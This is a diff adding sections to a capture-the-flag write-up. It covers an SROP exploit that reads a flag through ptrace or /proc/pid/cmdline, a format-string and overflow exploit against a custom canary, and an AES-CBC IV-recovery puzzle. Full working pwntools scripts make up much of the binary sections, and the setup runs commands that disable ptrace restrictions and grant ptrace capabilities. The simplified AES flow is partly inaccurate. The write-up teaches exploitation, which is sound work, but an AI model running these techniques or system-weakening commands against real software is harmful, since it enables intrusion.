@@ -66,7 +66,15 @@ and return store the base pointer and saved instruction pointer on the
 stack except it saves almost all of the registers.</p>
 <p>The requirements for SROP are very simple, you need at least 312
 bytes of user controlled data on the stack (which is for our sigreturn
-frame), and you need to do a syscall with rax being set to 0xf.</p>
+frame), and you need to do a syscall with rax being set to 0xf. We can
+see by looking at the binary that there is a function that does a
+syscall sigreturn for us.</p>
+<pre><code>00401219  int64_t sub_401219(uint64_t arg1)
+
+00401219  6a0f               push    0xf {var_8}
+0040121b  58                 pop     rax {var_8}  {0xf}
+0040121c  0f05               syscall 
+0040121e  c3                 retn     {__return_addr}</code></pre>
 <h3 id="exploitation">Exploitation</h3>
 <p>Overall, we found that the scotty binary was ran with the flag as its
 first argument. There are two general ways to solve this. The first
@@ -75,5 +83,481 @@ in thought1 after getting an srop chain going. The second is that since
 we have the process id, and open, read, write; we can read whats at
 <code>/proc/{pid}/cmdline</code> which prints what was used to execute
 that process.</p>
+<h4 id="syscalls">Syscalls</h4>
+<p>Looking at the easier exploit the calls that we would want to make
+would be something like this.</p>
+<pre><code>1. open(&quot;/proc/{pid}/&quot;)
+2. read(3, &amp;stack\_addr, size)
+3. write(stdout, &amp;stack\_addr, size)</code></pre>
+<p>In the read call we can determine the fd based on how many files the
+program has opened. &gt; By defualt every program opens the file
+descriptors 0-2 (0: stdin, 1: stdout, 2: stderr). Since don’t have any
+file descriptors that are open, the file descriptor from our open call
+should be 3.</p>
+<blockquote>
+<p>(In this case, we open pid.txt, but immediately close the file
+descriptor after being read.)</p>
+</blockquote>
+<p>For our exploit using ptrace we would write a chain with these
+functions.</p>
+<pre><code>1. ptrace(PTRACE\_ATTACH, scotty\_pid)
+2. ptrace(PTRACE\_PEEKDATA, scotty\_pid, &amp;thought1)
+3. write(1, &amp;stack\_addr, 8)
+4. ptrace(PTRACE\_PEEKDATA, scotty\_pid, &amp;flag\_addr, &amp;stack\_addr) # until we fully get flag
+5. write(1, &amp;stack\_addr, 0x30)</code></pre>
+<p>There were also a few tricks that I got caught with with ptrace</p>
+<blockquote>
+<p>The first is that this program expects a small pid, anything with a
+big enough pid will break To enable ptrace for this exploit run this
+command <code>echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</code></p>
+</blockquote>
+<h4 id="setting-up-an-srop-chain">Setting up an SROP Chain</h4>
+<p>Now we have to setup the srop chain so that we can perform as many
+srop calls as we want. To do this we have to create a fake stack. We
+first need to read to an empty place in memory.</p>
+<h5 id="finding-writable-memory">Finding writable memory</h5>
+<p>A general trick for finding a place in memory to write to is to look
+in gdb and look at the memory mapping. If we look for a section of
+memory that is writeable at the end of the binary, there will usuallybe
+an empty section that is writeable.</p>
+<p>When the kernel maps memory pages for a process, each page much be in
+increments of 0x1000 bytes. However, most ELF binaries do not use all of
+the space that is allocated to it. So we can usually find extra space
+within the binary to write to.</p>
+<p>We want to read all of our sigreturn frames on to this fake stack and
+then use that as our stack. I am going to add a little bit of space in
+the front for us to read and write data to. When setting our first srop
+we want to set rsp and rbp to be our buffer. Each time we execute a new
+sigreturn frame, we also want to add the size of a sigframe to rsp. A
+general formula for setting this would look like this:</p>
+<blockquote>
+<p><code>rsp = fake_stack_buffer + sizeof(sigreturn_frame) * index</code></p>
+</blockquote>
+<h3 id="exploit">Exploit</h3>
+<p>Below is the exploit for both methods that we went over.</p>
+<pre><code>#!/usr/bin/python
+from pwn import *
+from os import system
+
+context.update(
+        arch=&quot;amd64&quot;,
+        endian=&quot;little&quot;,
+        log_level=&quot;debug&quot;,
+        os=&quot;linux&quot;,
+        terminal=[&quot;st&quot;]
+)
+
+
+def start(binary):
+
+    gs = &#39;&#39;&#39;
+        set context-sections stack regs disasm
+        set show-compact-regs on
+        set resolve-heap-via-heuristic on
+        b main
+    &#39;&#39;&#39;
+
+    if args.GDB:
+        return gdb.debug(binary, gdbscript=gs)
+    elif args.REMOTE:
+        return remote(&#39;mindmeld.martiansonly.net&#39;,31337)
+    else:
+        return process(binary)
+
+def build_srop_chain(frame, exp):
+
+    buffer = 0x404200
+    syscall_ret = 0x40121c
+    sigreturn_sys = 0x401219
+    memory_size = 0x80
+
+    if frame == None:
+        return
+
+    frame.rip = syscall_ret
+    frame.rbp = buffer
+
+    chain = b&#39;&#39;
+    log.info(f&quot;Creating srop chain with {len(exp)} calls&quot;)
+
+    for i in range(0, len(exp)):
+        call = exp[i]
+
+        rsp = buffer + memory_size + 256 * (i + 1)
+        log.info(f&quot;Rsp stack addr for {i} = {hex(rsp)}&quot;)
+
+        frame.rsp = rsp
+        frame.rax = call[0]
+        frame.rdi = call[1]
+        frame.rsi = call[2]
+        frame.rdx = call[3]
+        frame.r10 = call[4]
+
+        chain +=  p64(sigreturn_sys) + bytes(frame)
+
+    return chain
+
+
+def exploit_orig(p,e):
+
+    system(&quot;sudo setcap cap_sys_ptrace=ep $PWD/spock&quot;)
+    p.recvuntil(b&quot;Scotty&#39;s mental frequency is:&quot;)
+
+    pid = int(p.recvline().strip(),10)
+    log.info(f&quot;Got processes pid {pid}&quot;)
+
+    pad = b&quot;A&quot; * 24
+
+    buffer = 0x404200
+    syscall_ret = 0x40121c
+    sigreturn_sys = 0x401219
+    flag_heap_addr = 0x404050
+
+    memory_size = 0x80
+    frame_size = 248
+
+
+    # Read Sigreturn
+    rframe = SigreturnFrame(kernel=&#39;amd64&#39;)
+    rframe.rsi = buffer
+    rframe.rdx = 0x1000
+    rframe.rsp = buffer + memory_size
+    rframe.rbp = buffer
+    rframe.rip = syscall_ret
+
+    # pop rax syscall
+    chain = p64(sigreturn_sys) + bytes(rframe)
+
+    p.recvuntil(b&quot;Your thoughts to my thoughts &gt;&gt;&gt; &quot;)
+    p.sendline(pad + chain)
+    pause()
+
+
+    chain2 = b&quot;\x00&quot; * 0x80
+
+    frame = SigreturnFrame(kernel=&#39;amd64&#39;)
+    frame.rip = syscall_ret
+    frame.rbp = buffer
+
+    exp = [
+            [0x65, 16, pid, 0, 0, 0], # ptrace(PTRACE_ATTACH, pid)
+            [0x65, 2, pid, flag_heap_addr, buffer], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
+            [1, 1, buffer, 8, 0, 0], # write(stdout, fake_stack, 8)
+    ]
+
+    rframe.rsi = buffer + memory_size
+    chain2 += build_srop_chain(frame, exp)
+    chain2 += p64(sigreturn_sys) + bytes(rframe)
+
+    p.sendline(chain2)
+
+    heap_addr = u64(p.recv(8))
+    log.info(f&quot;Leaked flag address on the heap: {hex(heap_addr)}&quot;)
+
+
+    exp = [
+        [0x65, 2, pid, heap_addr, buffer+0x10], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
+        [0x65, 2, pid, heap_addr+8, buffer+0x18], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
+        [0x65, 2, pid, heap_addr+0x10, buffer+0x20], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
+        [0x65, 2, pid, heap_addr+0x18, buffer+0x28], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
+        [0x65, 2, pid, heap_addr+0x20, buffer+0x30], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
+        [0x65, 2, pid, heap_addr+0x28, buffer+0x38], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
+        [1, 1, buffer+0x10, 0x30, 0, 0], # write(stdout, fake_stack, 8)
+    ]
+
+    pause()
+    chain3 = build_srop_chain(frame, exp)
+
+    p.sendline(chain3)
+    p.interactive()
+
+
+
+def exploit_cheese(p,e):
+    p.recvuntil(b&quot;Scotty&#39;s mental frequency is:&quot;)
+
+    pid = int(p.recvline().strip(),10)
+    log.info(f&quot;Got processes pid {pid}&quot;)
+
+    pad = b&quot;A&quot; * 24
+
+    buffer = 0x404200
+    syscall_ret = 0x40121c
+    sigreturn_sys = 0x401219
+    flag_heap_addr = 0x404050
+
+    memory_size = 0x80
+
+    # Read Sigreturn
+    rframe = SigreturnFrame(kernel=&#39;amd64&#39;)
+    rframe.rsi = buffer
+    rframe.rdx = 0x1000
+    rframe.rsp = buffer + memory_size
+    rframe.rbp = buffer
+    rframe.rip = syscall_ret
+
+    # pop rax syscall
+    chain = p64(sigreturn_sys) + bytes(rframe)
+
+    p.recvuntil(b&quot;Your thoughts to my thoughts &gt;&gt;&gt;&quot;)
+    p.sendline(pad + chain)
+    pause()
+
+    chain2 = b&quot;/proc/%d/cmdline&quot; % pid
+    chain2 += b&quot;\x00&quot; * (0x80 - len(chain2))
+
+    frame = SigreturnFrame(kernel=&#39;amd64&#39;)
+    frame.rip = syscall_ret
+    frame.rbp = buffer
+
+    exp = [
+            [2, buffer, 0, 0, 0],    # open(&quot;/proc/(pid)/cmdline&quot;)
+            [0, 3, buffer + 0x30, 0x30, 0], # read(3, fake_stack, 0x30)
+            [1, 1, buffer + 0x30, 0x30, 0] # write(1, fake_stack, 0x50)
+    ]
+
+    chain2 += build_srop_chain(frame, exp)
+
+    # Read another rop chain with leak
+    chain2 += p64(sigreturn_sys) + bytes(rframe)
+
+    p.sendline(chain2)
+    p.interactive()
+
+
+if __name__==&quot;__main__&quot;:
+    file = args.BIN
+
+    p = start(file)
+    e = context.binary = ELF(file)
+
+    system(&quot;sudo setcap cap_sys_ptrace=ep $PWD/spock&quot;)
+    exploit_orig(p,e)
+    #exploit_cheese(p,e)
+</code></pre>
 <h2 id="helldivers">Helldivers</h2>
-<h2 id="section"></h2>
+<p>For this binary, we are given a single binary and some other helper
+scripts that are used for printing stuff to the screen.</p>
+<h3 id="mitigations-1">Mitigations</h3>
+<p>Using the checksec tool we can see what mitigations that the binary
+has, from looking at the results we can see that we have PIE, Full
+Relro, and NX. This means that we will have to get a leak for the base
+of the binary, that we can’t overwrite the GOT, and that we cannot
+execute shellcode on the stack.</p>
+<pre><code>checksec helldivers
+[*] &#39;/home/solardebris/development/writeups/spaceheroes24/helldive/helldivers&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+<p>When reversing the binary, we can see that there is a function
+similar to a canary that will run secure at the beginning of the
+function and validate at the end of a function mimicking a canary.</p>
+<h3 id="static-reversing-1">Static Reversing</h3>
+<p>The binary has a few main functions that are interesting being menu,
+deployObjective, secure, validate, and preamble. There is also a win
+function called superearthflag() which opens and reads the flag.</p>
+<h4 id="vulnerabilities">Vulnerabilities</h4>
+<p>Looking at the vulnerabilities, we can see that we have a printf
+format vulnerability. We can use this to leak different addresses. For
+this I am going to leak PIE, the stack, and the heap.</p>
+<p>We can also use a printf for writing, although i forgot about this so
+I did things a bit more complicated. There is also a gets that we can
+use to overwrite the return address.</p>
+<h4 id="custom-canary-implementation">Custom Canary Implementation</h4>
+<p>The secure function takes in a pointer as an argument, creates a heap
+chunk and sets it to be the argument. It then also inserts the argument
+into a canary list into a mmapped chunk.</p>
+<pre><code>00001390  int64_t* secure(int64_t arg1)
+
+000013a1      int64_t* rax = malloc(bytes: 8)
+000013b2      *rax = arg1
+000013b5      int64_t var_10 = 0
+000013bd      int32_t gsbase[0x2]
+000013bd      uint64_t rax_2 = _readgsbase_u32(gsbase)
+000013df      while (*(rax_2 + (var_10 &lt;&lt; 3)) != 0)
+000013e1          var_10 = var_10 + 1
+000013fb      *(gsbase + (var_10 &lt;&lt; 3)) = arg1
+00001405      return rax</code></pre>
+<p>The validate function does the opposite and checks that the return
+pointer is equal to both the heap pointer and the element in the list
+above. It will then free the heap chunk and remove the pointer from the
+canary list.</p>
+<pre><code>000012d4  int64_t validate(int64_t arg1, int64_t* arg2)
+
+000012e4      int64_t var_10 = 0
+000012ec      int32_t gsbase[0x2]
+000012ec      uint64_t r12 = _readgsbase_u32(gsbase)
+00001315      while (*(r12 + ((var_10 + 1) &lt;&lt; 3)) != 0)
+00001317          var_10 = var_10 + 1
+00001346      if (arg1 == *(r12 + (var_10 &lt;&lt; 3)) &amp;&amp; arg1 == *arg2)
+0000135b          *(r12 + (var_10 &lt;&lt; 3)) = 0
+00001369          free(mem: arg2)
+0000138f          return 0
+0000137f      puts(str: &quot;\-\-\ TREASON DETECTED /-/-/&quot;)
+00001389      exit(status: 1)
+00001389      noreturn</code></pre>
+<h4 id="overwriting-the-canary">Overwriting the Canary</h4>
+<p>For overwriting the canary list we can look at the deployObjective
+function. We can see through reversing that we can set one of the
+canaries in the canary list.</p>
+<pre><code>0000187c  int64_t deployObjective()
+
+00001888      int64_t* rax = secure(__return_addr)
+00001894      int64_t buf = 0
+000018a6      puts(str: &quot;Aligning super destroyer...&quot;)
+000018ab      int32_t gsbase[0x2]
+000018ab      uint64_t r12 = _readgsbase_u32(gsbase)
+000018bc      sleep(seconds: 1)
+000018cb      puts(str: &quot;Calculating mission integrity...&quot;)
+000018de      uint64_t rax_5 = r12 ^ zx.q(supermangler)
+000018ea      sleep(seconds: 1)
+000018f9      puts(str: &quot;Have you discussed aqcuiring the…&quot;)
+0000190f      read(fd: 0, buf: &amp;buf, nbytes: 8)
+0000191f      uint64_t rax_8 = rax_5 ^ zx.q(buf.w)
+00001930      puts(str: &quot;Consulting Democracy Officer...&quot;)
+0000193a      sleep(seconds: 1)
+00001949      puts(str: &quot;Verify mission credentials:&quot;)
+0000195f      read(fd: 0, buf: &amp;buf, nbytes: 8)
+0000196c      *rax_8 = buf
+00001974      sleep(seconds: 1)
+00001983      puts(str: &quot;Updating...&quot;)
+0000198d      sleep(seconds: 1)
+0000199c      puts(str: &quot;Munitions platform updated.&quot;)
+000019af      validate(__return_addr, rax)
+000019b6      return 0</code></pre>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>For our exploit we’ll overwrite the canary that returns from main and
+use the gets to overwrite both arguments to validate. Once we have
+control of both arguments to validate, we’ll set the second argument to
+be a reference to our win address which will be on the stack.</p>
+<p>Our overflow will look something like this.</p>
+<blockquote>
+<pre><code>      second_arg                       saved_ret    fake_chunk             fake_next_size</code></pre>
+<p>padding | p64(fake_chunk) | padding | ret_addr | … | 0x21 | p64(win)
+… | 0x21</p>
+</blockquote>
+<p>Below is the full exploit that leaks the stack and heap. Then
+overwrites the value on the canary list. Then finally overwrites the two
+arguments in validate() that gets called at the end of main.</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co">#! /usr/bin/python</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>context.update(</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>        arch<span class="op">=</span><span class="st">&quot;amd64&quot;</span>,</span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>        endian<span class="op">=</span><span class="st">&quot;little&quot;</span>,</span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>        log_level<span class="op">=</span><span class="st">&quot;info&quot;</span>,</span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>        os<span class="op">=</span><span class="st">&quot;linux&quot;</span>,</span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>        terminal<span class="op">=</span>[<span class="st">&quot;st&quot;</span>]</span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a>)</span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> start(binary):</span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a>    gs <span class="op">=</span> <span class="st">&#39;&#39;&#39;</span></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="st">        set context-sections stack regs disasm</span></span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a><span class="st">        set show-compact-regs on</span></span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a><span class="st">        set resolve-heap-via-heuristic on</span></span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a><span class="st">        set follow-fork-mode parent</span></span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a><span class="st">        b *menu</span></span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a><span class="st">    &#39;&#39;&#39;</span></span>
+<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> args.GDB:</span>
+<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> gdb.debug(binary, gdbscript<span class="op">=</span>gs)</span>
+<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>    <span class="cf">elif</span> args.REMOTE:</span>
+<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> remote(<span class="st">&quot;helldivers.martiansonly.net&quot;</span>, <span class="dv">6666</span>)</span>
+<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> process(binary)</span>
+<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> exploit(p,e,r):</span>
+<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a>    objective <span class="op">=</span> <span class="st">b&quot;</span><span class="ch">\xe2\xac\x87</span><span class="st"> </span><span class="ch">\xe2\xac\x86</span><span class="st"> </span><span class="ch">\xe2\xac\x87</span><span class="st"> </span><span class="ch">\xe2\xac\x86\x00</span><span class="st">&quot;</span></span>
+<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">b&quot;%22$p&quot;</span>)</span>
+<span id="cb14-34"><a href="#cb14-34" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;Deploying stratagem:&quot;</span>)</span>
+<span id="cb14-35"><a href="#cb14-35" aria-hidden="true" tabindex="-1"></a>    p.recvline()</span>
+<span id="cb14-36"><a href="#cb14-36" aria-hidden="true" tabindex="-1"></a>    stack_addr <span class="op">=</span> <span class="bu">int</span>(p.recvline(),<span class="dv">16</span>) <span class="op">-</span> <span class="dv">24</span></span>
+<span id="cb14-37"><a href="#cb14-37" aria-hidden="true" tabindex="-1"></a>    log.info(<span class="ss">f&quot;Leaked stack address </span><span class="sc">{</span><span class="bu">hex</span>(stack_addr)<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-38"><a href="#cb14-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-39"><a href="#cb14-39" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Leak saved ret val from heap</span></span>
+<span id="cb14-40"><a href="#cb14-40" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">b&quot;%21$p&quot;</span>)</span>
+<span id="cb14-41"><a href="#cb14-41" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;Deploying stratagem:&quot;</span>)</span>
+<span id="cb14-42"><a href="#cb14-42" aria-hidden="true" tabindex="-1"></a>    p.recvline()</span>
+<span id="cb14-43"><a href="#cb14-43" aria-hidden="true" tabindex="-1"></a>    heap_addr <span class="op">=</span> <span class="bu">int</span>(p.recvline(),<span class="dv">16</span>)</span>
+<span id="cb14-44"><a href="#cb14-44" aria-hidden="true" tabindex="-1"></a>    log.info(<span class="ss">f&quot;Leaked heap address </span><span class="sc">{</span><span class="bu">hex</span>(heap_addr)<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-45"><a href="#cb14-45" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-46"><a href="#cb14-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-47"><a href="#cb14-47" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Get PIE base</span></span>
+<span id="cb14-48"><a href="#cb14-48" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">b&quot;%29$p&quot;</span>)</span>
+<span id="cb14-49"><a href="#cb14-49" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;Deploying stratagem:&quot;</span>)</span>
+<span id="cb14-50"><a href="#cb14-50" aria-hidden="true" tabindex="-1"></a>    p.recvline()</span>
+<span id="cb14-51"><a href="#cb14-51" aria-hidden="true" tabindex="-1"></a>    pie_base <span class="op">=</span> <span class="bu">int</span>(p.recvline().strip(),<span class="dv">16</span>) <span class="op">-</span> <span class="dv">4700</span></span>
+<span id="cb14-52"><a href="#cb14-52" aria-hidden="true" tabindex="-1"></a>    log.info(<span class="ss">f&quot;Leaked PIE Base </span><span class="sc">{</span><span class="bu">hex</span>(pie_base)<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-53"><a href="#cb14-53" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-54"><a href="#cb14-54" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-55"><a href="#cb14-55" aria-hidden="true" tabindex="-1"></a>    win <span class="op">=</span> p64(e.sym[<span class="st">&quot;superearthflag&quot;</span>] <span class="op">+</span> pie_base)</span>
+<span id="cb14-56"><a href="#cb14-56" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-57"><a href="#cb14-57" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;Waiting on your call, helldiver &gt;&gt;&gt;&quot;</span>)</span>
+<span id="cb14-58"><a href="#cb14-58" aria-hidden="true" tabindex="-1"></a>    p.sendline(objective)</span>
+<span id="cb14-59"><a href="#cb14-59" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-60"><a href="#cb14-60" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Overwrite the canary saved for main+34</span></span>
+<span id="cb14-61"><a href="#cb14-61" aria-hidden="true" tabindex="-1"></a>    xor_value <span class="op">=</span> p64(<span class="bn">0x1337</span>)</span>
+<span id="cb14-62"><a href="#cb14-62" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-63"><a href="#cb14-63" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;your Democracy Officer today?&quot;</span>)</span>
+<span id="cb14-64"><a href="#cb14-64" aria-hidden="true" tabindex="-1"></a>    p.send(xor_value)</span>
+<span id="cb14-65"><a href="#cb14-65" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-66"><a href="#cb14-66" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;Verify mission credentials:&quot;</span>)</span>
+<span id="cb14-67"><a href="#cb14-67" aria-hidden="true" tabindex="-1"></a>    p.send(win)</span>
+<span id="cb14-68"><a href="#cb14-68" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-69"><a href="#cb14-69" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">&quot;Quit&quot;</span>)</span>
+<span id="cb14-70"><a href="#cb14-70" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-71"><a href="#cb14-71" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Return value to main+34</span></span>
+<span id="cb14-72"><a href="#cb14-72" aria-hidden="true" tabindex="-1"></a>    ret_val <span class="op">=</span> p64(pie_base <span class="op">+</span> <span class="bn">0x127e</span>)</span>
+<span id="cb14-73"><a href="#cb14-73" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-74"><a href="#cb14-74" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Return value for menu to main</span></span>
+<span id="cb14-75"><a href="#cb14-75" aria-hidden="true" tabindex="-1"></a>    exp <span class="op">=</span> cyclic(<span class="dv">120</span>) <span class="op">+</span> p64(heap_addr) <span class="op">+</span> p64(stack_addr<span class="op">+</span><span class="bn">0x30</span>) <span class="op">+</span> ret_val</span>
+<span id="cb14-76"><a href="#cb14-76" aria-hidden="true" tabindex="-1"></a>    exp <span class="op">+=</span> cyclic(<span class="dv">32</span>) <span class="op">+</span> p64(stack_addr<span class="op">+</span><span class="bn">0x108</span>) <span class="op">+</span> <span class="st">b&quot;A&quot;</span> <span class="op">*</span> <span class="dv">8</span> <span class="op">+</span> win <span class="op">+</span> <span class="st">b&quot;B&quot;</span> <span class="op">*</span> <span class="dv">184</span> <span class="op">+</span> p64(<span class="dv">0</span>)  <span class="op">+</span> p64(<span class="bn">0x21</span>) <span class="op">+</span> win <span class="op">+</span> cyclic(<span class="bn">0x10</span>) <span class="op">+</span> p64(<span class="bn">0x21</span>)</span>
+<span id="cb14-77"><a href="#cb14-77" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-78"><a href="#cb14-78" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;Waiting on your call, helldiver &gt;&gt;&gt;&quot;</span>)</span>
+<span id="cb14-79"><a href="#cb14-79" aria-hidden="true" tabindex="-1"></a>    p.sendline(exp)</span>
+<span id="cb14-80"><a href="#cb14-80" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-81"><a href="#cb14-81" aria-hidden="true" tabindex="-1"></a>    p.interactive()</span>
+<span id="cb14-82"><a href="#cb14-82" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-83"><a href="#cb14-83" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-84"><a href="#cb14-84" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span><span class="op">==</span><span class="st">&quot;__main__&quot;</span>:</span>
+<span id="cb14-85"><a href="#cb14-85" aria-hidden="true" tabindex="-1"></a>    <span class="bu">file</span> <span class="op">=</span> args.BIN</span>
+<span id="cb14-86"><a href="#cb14-86" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-87"><a href="#cb14-87" aria-hidden="true" tabindex="-1"></a>    p <span class="op">=</span> start(<span class="bu">file</span>)</span>
+<span id="cb14-88"><a href="#cb14-88" aria-hidden="true" tabindex="-1"></a>    e <span class="op">=</span> context.binary <span class="op">=</span> ELF(<span class="bu">file</span>)</span>
+<span id="cb14-89"><a href="#cb14-89" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> ROP(e)</span>
+<span id="cb14-90"><a href="#cb14-90" aria-hidden="true" tabindex="-1"></a>    exploit(p,e,r)</span></code></pre></div>
+<h2 id="this-is-neat">This is Neat</h2>
+<p>This is a basic AES CBC challenge, We’re given the key and the 16
+characters of the known plaintext, but we don’t know the iv. AES CBC
+requires an IV and a KEY, it encrypts and decrypts in blocks of 16 bytes
+which is important for this challenge. We know that the key is
+b”3153153153153153” and that the message starts with
+<q>Mortimer_McMire:</q>. To get the key all we need to know now is the
+IV.</p>
+<h3 id="aes-cbc">AES CBC</h3>
+<p>AES is a symettrical cipher which means that the same key can be used
+to encrypt and decrypt. Here is a simple flow graph of how AES CBC
+encrypts and decrypts (this might be wrong but is very simplified).</p>
+<h4 id="encryption">Encryption</h4>
+<blockquote>
+<p>IV ^ KEY -&gt; AES_ENCRYPT(KEY, PLAINTEXT) -&gt; CIPHERTEXT</p>
+</blockquote>
+<h4 id="decrytpion">Decrytpion</h4>
+<blockquote>
+<p>AES_DECRYPT(CIPHERTEXT, KEY) -&gt; RESULT ^ IV -&gt; PLAINTEXT</p>
+</blockquote>
+<p>Since AES CBC uses xor, we can encrypt our known plaintext with the
+key, but have an IV filled with 0s. Then we can xor the ciphertext that
+we generated with the original ciphertext to get the iv that was
+used.</p>
+<p>Now that we have the IV we can decrypt it and get the flag.</p>
+<blockquote>
+<p>python encrypt.py b’dC$_1epK
+shctf{th1s_was_ju5t_a_big_d1str4ction}’</p>
+</blockquote>
